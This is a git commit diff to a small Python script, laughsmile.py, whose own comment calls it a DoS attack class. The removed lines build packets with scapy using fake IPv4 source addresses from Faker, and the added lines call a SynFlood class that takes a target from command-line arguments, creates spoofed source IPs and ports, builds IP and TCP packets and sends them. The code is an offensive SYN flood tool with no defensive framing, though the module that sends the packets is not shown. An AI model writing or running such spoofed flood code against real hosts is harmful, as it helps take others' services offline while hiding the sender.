e754d40b123164d09f5f54f654b7392cbe4bb823
kouhei0128 <kouhei1412@outlook.jp>
2023-07-02 19:28:13 +0900

    can send syn packet

--- laughsmile.py
+++ laughsmile.py
@@ -1,21 +1,13 @@
-from scapy.all import IP, TCP, send
-from faker import Faker
+import sys
+# pychacheを作成しない
+sys.dont_write_bytecode = True
+from dos import syn_flood as sf
 
-class Main():
+class Main:
     # Dos攻撃クラス
-    pass
-
-# 引数から宛先IPの受け取り
-get_dst_ip = ''
-
-# 偽IPv4アドレスを生成
-fake = Faker()
-src_ip = fake.ipv4()
-
-src_dst_ip = IP(src_ip, get_dst_ip)
-send()
-# TCP packet
-#https://xtech.nikkei.com/atcl/nxt/column/18/00975/091700008/
-
-#Python option
-#https://qiita.com/Esfahan/items/72b3c34d744eaaea6c93
+    da = sf.SynFlood(sys.argv[1], sys.argv[2], sys.argv[3])
+    da.createSrcIp()
+    da.createSrcPort()
+    da.createIpPacket()
+    da.createTcpPacket()
+    da.sendPacket()
